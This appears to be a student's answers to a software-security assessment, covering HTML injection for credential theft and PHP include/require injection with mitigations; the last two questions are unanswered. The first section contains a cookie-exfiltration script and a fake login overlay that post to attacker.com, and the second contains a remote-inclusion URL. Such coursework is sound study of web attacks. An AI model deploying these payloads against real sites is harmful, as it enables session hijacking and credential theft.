# Assessment 2

**Author:** Waldemar Schwab  
**Created on:** 2024-05-12
**Fernuniversität Hagen** Software-Security

## Describe how an HTML-attack could be abused to gain access to credentials. (25)

A HTML attack can be realized on different ways. And always consists of different type (stored HTML Injection or Reflected HTML injection) and attack vecors. 
Vecots:

- Stored HTML Injection: Persistant attacks like entries in a Comment Section or in a blog.
- Reflected HTML injectio: URL-Injection when Parameters are not escaped the right way
  - these URLs can be sent via E-Mail or other communication tools
  - spread via forums and other (social) platforms 

Ways to steal credentials:

- Inject JS-Code and Replace original Login Form
  - Inject new Form fields
    - Hide original Form Field
    - Place your own Imput-Elements on site and replace the action path with somethin useful to you
- Inject JS-Code to exfiltrate original
  - before committing the Login Form intercept the login Progress and send the data to your own server.
- Skip the login-part and steal the Session-Cookie right away:
  - Use someting like `<script>var img=new Image();img.src='http://attacker.com/stealcookie.php?cookie='+document.cookie;</script>`
- Inject HTML and CSS code without JS
  - Hide original form fields via CSS (inline or siyle attribute)
    - add your own Input-Elements right via html
    - or just add a huge Login-Banner over the page: `<div style="position:absolute;top:0;left:0;width:100%;height:100%;z-index:1000;"><form action='http://attacker.com/capture_credentials.php' method='post'><input type='text' name='username'><input type='password' name='password'><input type='submit' value='Login'></form></div>`

## Explain how PHP-code-injections via include / require could be achieved - and prevented. (25)
Again there can be different ways to manipulate the parameter of include or require. But then multiple ways are possible for exploitation. 

Manipulation:
- When `include('content/' . $_GET['page'] . '.php');` is used you can simply maniupulate the URL and include other files then expected. 
  - Exploitation: `http://example.com/?page=http://attacker.com/malicious`
    - Prepared File on a Webserver has to be provided by the attacker.
    - After successfull infiltration, PHP Code execution is possible and might give access to other sensitive files, e.g. Database connection information, `/etc/passwd`
    - This attack reqires in a setting PHP configuration to set like this:`allow_url_include = On`
  - Mitigation:
    - Simply turn off the setting: `allow_url_include = Off`
- Lets go on with the last example and assume that `allow_url_include = Off` is set.
  - Exploitation: http://example.com/?page=admin
    - You still might be able to browse into other files: e.g there might be an admin.php waiting for us, that could be accessed or still database configuration might be somewhere stored in a php File
    - You might need to extend this attack and upload your own file via an other exploit, like unchecked file extensions on a Picture-Upload-Page on the same server.
    - Mitigation: Add input validation for expected values in $_GET['page']
    ```PHP
      $allowedPages = ['home', 'about', 'contact']; // List of allowed pages
      $page = $_GET['page'] ?? 'default'; // Default page if none specified

      if (in_array($page, $allowedPages)) { ... }
    ```
    moreover you should add absolute paths instead of relative paths to block transversal movement:
    ```PHP
      define('BASE_PATH', realpath('content/')); // Ensure the base path is absolute and normalized
      $page = $_GET['page'] ?? 'default';
      if (in_array($page, $allowedPages)) {
          $filePath = BASE_PATH . '/' . $page . '.php';
          if (file_exists($filePath)) {
              include($filePath);
          } else {
              include(BASE_PATH . '/error.php');
          }
      } else {
          include(BASE_PATH . '/error.php');
      }
    ```

  


## Discuss how PRNGs could put session-management at risk. (25)

## How would secure programming create session IDs? (25)
